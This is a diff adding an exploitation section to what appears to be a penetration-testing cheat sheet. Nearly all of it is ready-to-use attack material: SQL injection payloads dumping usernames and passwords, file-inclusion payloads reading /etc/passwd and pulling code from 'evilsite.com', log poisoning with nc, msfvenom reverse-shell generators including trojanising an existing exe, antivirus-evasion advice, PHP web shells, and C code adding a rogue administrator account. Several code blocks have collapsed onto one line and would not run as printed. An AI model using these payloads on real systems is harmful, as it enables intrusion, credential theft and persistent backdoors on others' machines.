@@ -789,4 +789,264 @@
 
 
 
+## Exploitation
+
+### [SQLi](#sqli)
+
+- Check if you can find a row, where you can place your output
+  `http://ip/inj.php?id=1 union all select 1,2,3,4,5,6,7,8`
+- Get the version of the database
+  `http://ip/inj.php?id=1 union all select 1,2,3,@@version,5`
+- Get the current user
+  `http://ip/inj.php?id=1 union all select 1,2,3,user(),5`
+- See all tables
+  `http://ip/inj.php?id=1 union all select 1,2,3,table_name,5 FROM information_schema.tables`
+- Get column names for a specified table
+  `http://ip/inj.php?id=1 union all select 1,2,3,column_name,5 FROM information_schema.columns where table_name='users'`
+- Concat user names and passwords (0x3a represents “:”)
+  `http://ip/inj.php?id=1 union all select 1,2,3,concat(name, 0x3A , password),5 from users`
+- Write into a file
+  `http://ip/inj.php?id=1 union all select 1,2,3,"content",5 into OUTFILE 'outfile'`
+
+### [PHP](#php)
+
+Got most of this from https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/
+
+- LFI
+
+  If there is an LFI, it might be possible to run PHP commands as within the example from exploit-db (https://www.exploit-db.com/exploits/9623/):
+
+  ```
+  www.site/path/advanced_comment_system/admin.php?ACS_path=[shell.txt?]
+  ```
+
+   This results in this exploit:
+
+  
+
+  ```
+  curl -s --data "<?system('ls -la');?>" "http://www.site/path/advanced_comment_system/admin.php?ACS_path=php://input%00"
+  ```
+
+- Including files
+  `?file=.htaccess`
+
+- Path Traversal
+  `?file=../../../../../../../../../var/lib/locate.db`
+
+- Including injected PHP code
+
+  ```
+  ?file=../../../../../../../../../var/log/apache/error.log
+  ```
+
+  
+
+  - Tricks
+    - list of possible Apache dirs: http://wiki.apache.org/httpd/DistrosDefaultLayout
+    - include access log from file descriptor /proc/self/fd/XX: http://pastebin.com/raw.php?i=cRYvK4jb
+    - include email log files: http://devels-playground.blogspot.de/2007/08/local-file-inclusion-tricks.html
+    - include ssh auth.log
+    - abuse avatar/image/attachment file uploads
+    - include session files: https://ddxhunter.wordpress.com/2010/03/10/lfis-exploitation-techniques/
+    - include PHP’s temporarily uploaded files http://gynvael.coldwind.pl/?id=376
+    - Null Byte Injection:
+      `?file=../../../../../../../../../etc/passwd%00`
+    - Directory Listing with Null Byte Injection:
+      `?file=../../../../../../../../../var/www/accounts/%00`
+    - Path Truncation:
+      `?file=../../../../../../../../../etc/passwd.\.\.\.\.\.\.\.\.\.\.\ ...`
+    - Dot Truncation:
+      `?file=../../../../../../../../../etc/passwd...........`
+    - Reverse Path Truncation:
+      `?file=../../../../ […] ../../../../../etc/passwd`
+
+- Logfile injection
+
+  - Connect to the server to inject code into the error.log:
+
+    ```
+    nc <IP> <port> GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1 Host: <IP> Connection: close
+    ```
+
+  - Afterwards include the it via LFI:
+    `?lfi_file=/var/log/apache2/access.log&cmd=<command>`
+
+- Including Remote Code:
+  `?file=[http|https|ftp]://evilsite.com/shell.txt`
+
+- Using PHP stream php://input:
+  `?file=php://input`
+  Specify your payload in the POST parameters
+
+- Using PHP stream php://filter:
+  `?file=php://filter/convert.base64-encode/resource=index.php`
+
+- Using data URIs:
+  `?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=`
+
+- Using XSS:
+  `?file=http://127.0.0.1/path/xss.php?xss=phpcode`
+
+### [Generating Shells](#generating-shells)
+
+Depending on the specific case it could be useful to also add “PrependMigrate=true”.
+As most of those generated files will be detected by an antivirus software, it might be useful to also experiment with the Veil Framework.
+
+- Linux ELF binary:
+
+  ```
+  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
+  ```
+
+- Windows EXE binary:
+
+  ```
+  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
+  ```
+
+- Windows Service:
+
+  ```
+  msfvenom -p windows/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> EXITFUNC=thread -f exe-service > shell-service.exe
+  ```
+
+- Mac:
+
+  ```
+  msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
+  ```
+
+- PHP:
+
+  ```
+  msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > /tmp/shell.php && sed -i 's/#<?php/<?php/' /tmp/shell.php
+  ```
+
+  If you use php/reverse_php open the output file with an editor and add `<?php` and `?>` within the script.
+
+- ASP:
+
+  ```
+  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
+  ```
+
+- JSP:
+
+  ```
+  msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
+  ```
+
+- WAR:
+
+  ```
+  msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
+  ```
+
+- Inject payload into an existing exe file:
+
+  ```
+  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -x <template EXE> -f exe > <output.exe>
+  ```
+
+#### [Custom Shells](#custom-shells)
+
+- PHP custom command injection:
+
+  ```
+  <?php $cmd=$_GET['cmd']; system("$cmd"); ?>
+  ```
+
+  or
+
+  ```
+  <?php echo shell_exec($_GET['cmd']);?>
+  ```
+
+  If you use REQUEST, you can use the GET and POST parameter:
+
+  ```
+  <?php $cmd=$_REQUEST['cmd']; system("$cmd"); ?>
+  ```
+
+  Write a script to trigger the commands via CLI:
+
+  ```
+  #!/bin/bash URL="http://x.x.x.x:yyyy/cmd_shell.php" CMD=`echo ${*} | sed s'/ /%20/g'` CMD=`echo ${CMD} | sed s'/&/%26/g'` CMD=`echo ${CMD} | sed s'/>/%3e/g'` echo ${URL}?cmd=${CMD} curl -s ${URL}?cmd=${CMD} echo ""
+  ```
+
+  and execute it:
+
+  ```
+  ./cmd_inj ls -la
+  ```
+
+### [Compiling](#compiling)
+
+- To compile 32 bit applications on 64 bit Linux:
+
+  ```
+  apt-get install libc6-dev-i386 gcc -Wall -m32 -o <output> <code>
+  ```
+
+- Complining 64 bit applications on Linux:
+
+  ```
+  gcc -Wall -m64 -o <output> <code>
+  ```
+
+To compile static applications use the “-static” parameter additionally!
+
+- Cross-Compiling Windows applications on Linux:
+
+  ```
+  apt-get install mingw32 i586-mingw32msvc-gcc <source>.c -o <outfile> -lws2_32
+  ```
+
+- Generate EXE from python file in Windows:
+
+  ```
+  python pyinstaller.py --onefile <pythonscript>
+  ```
+
+### [Privilege Escalation](#privilege-escalation)
+
+- Check File permissions via icacls and check if they might be writeable for everyone:
+
+  ```
+  icacls <filename>
+  ```
+
+- C-Code to add a new user to the administrator group:
+
+  ```
+  #include <stdlib.h> /* system, NULL, EXIT_FAILURE */ // add new user to administrators group // compile with mingw32: // i586-mingw32msvc-gcc -o useradd_win useradd_win.c int main(){ int i; i=system ("net user <username> <password> /add"); i=system ("net localgroup administrators <username> /add"); return 0; }
+  ```
+
+- Windows Exploit Suggester:
+
+  - Get sysinfo from Windows:
+
+    ```
+    systeminfo > sys.info
+    ```
+
+  - Upload the sys.info file to your Linux machine
+
+  - Update the Exploit Suggester:
+
+    ```
+    python windows-exploit-suggester.py -u
+    ```
+
+  - Execute it:
+
+    ```
+    python windows-exploit-suggester -d <databasefile> -i <sysinfofile>
+    ```
+
+
+
+
+=
 
